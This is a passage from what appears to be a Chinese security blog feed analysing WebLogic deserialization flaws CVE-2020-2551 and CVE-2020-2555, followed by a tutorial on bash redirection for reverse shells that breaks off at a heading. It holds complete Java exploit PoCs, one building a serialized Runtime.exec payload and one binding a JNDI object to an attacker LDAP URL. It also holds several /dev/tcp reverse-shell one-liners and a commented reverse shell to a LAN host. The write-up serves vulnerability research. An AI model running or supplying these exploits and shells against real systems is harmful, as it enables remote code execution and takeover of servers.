valueTag，蓝色RMI注册数据长度，绿色为RMI注册内容（之后属性值解析也类似）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846760327927.jpg" alt="-w600"></p><p>由于满足<code>ObjectStreamClass.supportsUnsafeSerialization() == true</code>，进入下面的处理逻辑：</p><p>首先通过反射获取实例对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846763190170.jpg" alt="-w1646"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846764221761.jpg" alt="-w857"></p><p>之后进入<code>weblogic.iiop.ValueHandlerImpl#readValue</code>，通过深度遍历将其字段全部读取出来放入<code>indirectionMap</code>内实现完整序列化</p><p>在读取属性值时，跟入到<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846780406325.jpg" alt="-w767"></p><p>在这里先通过<code>java.io.ObjectInputStream#defaultReadObject</code>会读取属性值到<code>JtaTransactionManager</code>中，同时生成一个 JndiTemplate 实例</p><p>跟入<code>initUserTransactionAndTransactionManager</code>，当userTransaction为空时，会通过从提供的userTransactionName中进行读取</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846784321693.jpg" alt="-w793"></p><p>一路跟到<code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#execute</code>，剩下就是 JNDI的内容了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/15846788075894.jpg" alt="-w844"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li>JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在</li><li>weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>bea<span class="token punctuation">.</span>core<span class="token punctuation">.</span>repackaged<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Gadgets<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2551</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// target host</span>        String port <span class="token operator">=</span> <span class="token string">"7001"</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// target port</span>        String url <span class="token operator">=</span> <span class="token string">"ldap://192.168.31.96:1099/exp2"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// rmi/ldap url</span>        Hashtable<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.initial"</span><span class="token punctuation">,</span> <span class="token string">"weblogic.jndi.WLInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.provider.url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"iiop://%s:%s"</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Context context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// get object to Deserialize</span>        JtaTransactionManager jtaTransactionManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JtaTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jtaTransactionManager<span class="token punctuation">.</span><span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        Remote remote <span class="token operator">=</span> Gadgets<span class="token punctuation">.</span><span class="token function">createMemoitizedProxy</span><span class="token punctuation">(</span>Gadgets<span class="token punctuation">.</span><span class="token function">createMap</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> jtaTransactionManager<span class="token punctuation">)</span><span class="token punctuation">,</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/e32c5d3e/2020-03-19%2011.14.37.gif" alt="2020-03-19 11.14.37"></p><h2 id="推荐资料"><a href="#推荐资料" class="headerlink" title="推荐资料"></a>推荐资料</h2><ol><li><a href="https://www.anquanke.com/post/id/201005#h3-17" target="_blank" rel="noopener">NAT网络问题</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉又该重温 JNDI 了。。。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555 简单分析</title>
    <link href="https://blog.sari3l.com/posts/fa80d225/"/>
    <id>https://blog.sari3l.com/posts/fa80d225/</id>
    <published>2020-03-12T14:47:39.000Z</published>
    <updated>2020-07-06T09:45:26.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840234109363.jpg" alt></p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>第一次调 weblogic，饶了一大圈 Orz</p><p>推荐：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><ol><li>通过上面的项目直接生成 docker 并启动</li><li>从 docker 中拷贝<code>/u01/app/oracle/middleware/wlserver/</code>&amp;<code>/u01/app/oracle/middleware/coherence/</code>出来</li><li>从 idea 打开 wlserver，将其下<code>moudules</code>&amp;<code>server/lib</code>加入 Libraries 中</li><li>将 coherence 目录下 lib 同样加入 Libraries</li><li>添加 remote，启动 debug</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840233209710.jpg" alt="-w254"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840260151465.jpg" alt="-w676"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键利用点<code>com.tangosol.util.filter.LimitFilter#toString</code>（如果分析过 commons-collections，可能对这里可以很熟悉），这里 m_comparator、m_oAnchorTop均可控，下一步就是看能否有可利用的 extract 函数来进一步发挥</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840234657593.jpg" alt="-w1108"></p><p>在<code>com.tangosol.util.extractor.ReflectionExtractor#extract</code>中，可以看到调用了 invoke（这熟悉的味道，难道没有想到 commons-collections 中的 tranform 么）</p><p>即我们可以通过反射执行命令，但需要一条反射链才能从头到尾执行恶意命令（再次回想ChainedTransformer）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840236583179.jpg" alt="-w1184"></p><p>这时关注到<code>com.tangosol.util.extractor.ChainedExtractor#extract</code>，主要在第一步调用时需要传入<code>Runtime.class</code>就可以组成一条完整的调用链，而从<code>LimitFilter</code>传过来<code>m_oAnchorTop</code>的又是可控的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840239207524.jpg" alt="-w575"></p><p>现在命令执行部分已经构造完成，我们需要的是反序列化入口到达<code>LimitFilter#toString</code></p><p>这里又用到了<code>javax.management.BadAttributeValueExpException#BadAttributeValueExpException</code>（又是熟悉的味道，细看commons-collections 5），注意到初始化时需要赋值为 null，再通过反射设置，否则会直接触发<code>toString</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/15840241576297.jpg" alt="-w760"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ChainedExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ReflectionExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>filter<span class="token punctuation">.</span>LimitFilter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2555</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(new String[]{""});</span>        ReflectionExtractor<span class="token punctuation">[</span><span class="token punctuation">]</span> reflectionExtractors <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"exec"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//                        new Object[]{new String[]{"/bin/sh", "-c", "/bin/sh -i &amp;> /dev/tcp/192.168.31.96/12345 0&lt;&amp;1"}}</span>                <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedExtractor chainedExtractor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedExtractor</span><span class="token punctuation">(</span>reflectionExtractors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        chainedExtractor.extract(Runtime.class);</span>        LimitFilter limitFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LimitFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setComparator</span><span class="token punctuation">(</span>chainedExtractor<span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setTopAnchor</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        limitFilter.toString();</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> limitFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>        Serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        Serializer.deserialize();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Serializer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        FileInputStream ios <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"java.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>ios<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/fa80d225/cve-2020-2555-1.gif" alt="cve-2020-2555-1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次调 weblogic，docker 都下半天&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>Java 反弹 Shell</title>
    <link href="https://blog.sari3l.com/posts/91ba290f/"/>
    <id>https://blog.sari3l.com/posts/91ba290f/</id>
    <published>2020-03-02T14:47:18.000Z</published>
    <updated>2020-07-06T09:45:18.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>简单记忆: </p><ul><li><code>&gt;</code>可在<code>&amp;</code>前、后</li><li><code>&lt;</code>只能在<code>&amp;</code>前</li></ul><h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1. 输入重定向"></a>1. 输入重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15828004794955.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ cat < test_fileHello World~</code></pre><h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2. 输出重定向"></a>2. 输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15828006043413.jpg" alt="-w693"></p><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ echo 'Hello World~' > test_file test@test:/tmp$ cat test_file Hello World~</code></pre><h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3. 标准输出与标准错误输出重定向"></a>3. 标准输出与标准错误输出重定向</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15828006688727.jpg" alt="-w692"></p><pre class=" language-shell"><code class="language-shell">// bash 1test@test:/tmp$ bash -i &> test// bash 2test@test:~$ ls -l /proc/5693/fd总用量 0lrwx------ 1 test test 64 2月  27 19:00 0 -> /dev/pts/2l-wx------ 1 test test 64 2月  27 19:00 1 -> /tmp/testl-wx------ 1 test test 64 2月  27 19:00 2 -> /tmp/testlrwx------ 1 test test 64 2月  27 19:00 255 -> /dev/tty</code></pre><h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4. 文件描述符的复制"></a>4. 文件描述符的复制</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15828014944337.jpg" alt="-w836"></p><p>注意：</p><ol><li>两种形式都是将 word 复制给 n</li><li>在第二种形式<code>&gt;&amp;</code>最后的描述中，如果没有指定<code>n</code>，且<code>word</code>无法解释成<code>整数</code>或<code>-</code>，则此命令会被解释为<code>标准输出与标准错误输出重定向</code></li></ol><p>根据此两点，如果<strong>n为数字，则解析为<code>文件描述符复制</code></strong></p><hr><p>这里还需要将<code>文件描述符的复制</code>与<code>标准输出与标准错误输出重定向</code>拿出来比较一番，注意下面<code>&gt;&amp;5</code>与<code>&amp;&gt;5</code>的区别</p><p>即<code>&amp;</code>是否紧跟数字<code>n</code>，会区分为<code>文件描述符n</code>和<code>文件n</code></p><ul><li><code>&gt;&amp;5</code> -&gt; 将<code>文件描述符5</code>复制给<code>stdout</code></li><li><code>&amp;&gt;5</code> -&gt; 将<code>stdout</code>、<code>stderr</code>重定向到<code>当前目录下名为5的文件</code></li></ul><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ exec 5<>test_file >&5test@test:~$ ls -l /proc/14396/fd总用量 0lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 1 -> /tmp/test_filelrwx------ 1 test test 64 2月  29 14:16 2 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file---test@test:/tmp$ exec 5<>test_file &>5test@test:~$ ls -l /proc/14396/fd总用量 0lrwx------ 1 test test 64 2月  29 14:16 0 -> /dev/pts/0l-wx------ 1 test test 64 2月  29 14:16 1 -> /tmp/5l-wx------ 1 test test 64 2月  29 14:16 2 -> /tmp/5lrwx------ 1 test test 64 2月  29 14:16 255 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:16 5 -> /tmp/test_file</code></pre><h3 id="5-打开文件描述符进行读写"><a href="#5-打开文件描述符进行读写" class="headerlink" title="5. 打开文件描述符进行读写"></a>5. 打开文件描述符进行读写</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15828164328837.jpg" alt="-w841"></p><blockquote><p>当exec命令对文件描述符操作的时候，就不会替换shell，而是操作完成后还会继续执行后面的命令</p></blockquote><pre class=" language-shell"><code class="language-shell">test@test:/tmp$ 5<>filetest@test:/tmp$ ls -l /proc/29753/fd总用量 0lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1---test@test:/tmp$ exec 5<>test_filetest@test:/tmp$ ls -l /proc/29753/fd总用量 0lrwx------ 1 test test 64 2月  29 12:04 0 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 255 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:04 5 -> /tmp/test_file</code></pre><h2 id="反弹"><a href="#反弹" class="headerlink" title="反弹"></a>反弹</h2><h3 id="文件描述符复制"><a href="#文件描述符复制" class="headerlink" title="文件描述符复制"></a>文件描述符复制</h3><p>最常见的模式</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1// 省略非必要空格<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345 0<span class="token operator">></span><span class="token operator">&amp;</span>1</code></pre><h3 id="文件描述符复制-2"><a href="#文件描述符复制-2" class="headerlink" title="文件描述符复制 2"></a>文件描述符复制 2</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/127.0.0.1/12345 <span class="token operator">&lt;</span><span class="token operator">&amp;</span>1// 省略非必要空格<span class="token function">bash</span> -i<span class="token operator">></span><span class="token operator">&amp;</span>/dev/tcp/127.0.0.1/12345<span class="token operator">&lt;</span><span class="token operator">&amp;</span>1</code></pre><h3 id="绑定重定向"><a href="#绑定重定向" class="headerlink" title="绑定重定向"></a>绑定重定向</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span><span class="token operator">></span>/dev/tcp/192.168.146.129/2333<span class="token punctuation">;</span><span class="token function">cat</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5<span class="token operator">|</span><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token variable">$line</span> <span class="token operator">></span><span class="token operator">&amp;</span>5 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span class="token punctuation">;</span><span class="token keyword">done</span></code></pre><p>注意为什么最后又加了一个<code>2&gt;&amp;1</code>呢？回头看看描述符复制注意的地方，就清楚了</p><hr><p>另外下面为什么没看到<code>进程30651的bash</code>中<code>stdout &amp; stderr</code>被重定向情况呢？因为每次<code>do</code>都是通过<strong>此bash</strong>新开启一个子进程，并在子进程内进行文件描述符的赋值</p><pre class=" language-shell"><code class="language-shell">test@test:~$ exec 5<>/dev/tcp/127.0.0.1/12345;cat <&5|while read line;do $line >&5 2>&1;done// 29753 执行反弹 shell 命令test     29753  4841  0 12:04 pts/1    00:00:00 bashtest     30640  4895  0 12:09 pts/2    00:00:00 nc -lvvp 12345test     30650 29753  0 12:09 pts/1    00:00:00 cattest     30651 29753  0 12:09 pts/1    00:00:00 bash// cattest@test:/tmp$ ls -l /proc/30650/fd总用量 0lrwx------ 1 test test 64 2月  29 12:48 0 -> 'socket:[1487308]'l-wx------ 1 test test 64 2月  29 12:48 1 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'// bashtest@test:/tmp$ ls -l /proc/30651/fd总用量 0lr-x------ 1 test test 64 2月  29 12:48 0 -> 'pipe:[1487309]'lrwx------ 1 test test 64 2月  29 12:48 1 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 2 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 255 -> /dev/pts/1lrwx------ 1 test test 64 2月  29 12:48 5 -> 'socket:[1487308]'</code></pre><h4 id="额外的例子"><a href="#额外的例子" class="headerlink" title="额外的例子"></a>额外的例子</h4><p><code>&lt;&amp;996 &gt;&amp;996 2&gt;&amp;996</code>分别对应复制到<code>stdin stdout stderr</code></p><pre class=" language-shell"><code class="language-shell">0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996// 变形exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996</code></pre><p>注意：变形的命令在连接端退出会导致此端同时退出，原因如下：</p><pre class=" language-shell"><code class="language-shell">// 0<&996;exec 996<>/dev/tcp/127.0.0.1/12345;sh <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest@test:~$ ls -l /proc/18999/fd总用量 0lrwx------ 1 test test 64 2月  29 14:44 0 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 1 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 2 -> 'socket:[106812]'lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0---// exec 996<>/dev/tcp/127.0.0.1/123450 <&996 >&996 2>&996test     18999  2516  0 14:44 pts/0    00:00:00 bashtest     20566 18999  0 14:53 pts/0    00:00:00 shtest@test:~$ ls -l /proc/18999/fd总用量 0lrwx------ 1 test test 64 2月  29 14:44 0 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:44 1 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:45 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:44 2 -> /dev/pts/0lrwx------ 1 test test 64 2月  29 14:44 255 -> /dev/pts/0test@test:~$ ls -l /proc/20566/fd总用量 0lrwx------ 1 test test 64 2月  29 14:53 0 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 1 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 196 -> 'socket:[105103]'lrwx------ 1 test test 64 2月  29 14:53 2 -> 'socket:[105103]'</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/assets/loading.gif" data-original="/posts/91ba290f/15829596110947.jpg" alt="https://xz.aliyun.com/t/2549#toc-8"></p><h2 id="反弹-in-Java"><a href="#反弹-in-Java" class="headerlink" title="反弹 in Java"></a>反弹 in Java</h2><h3 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" 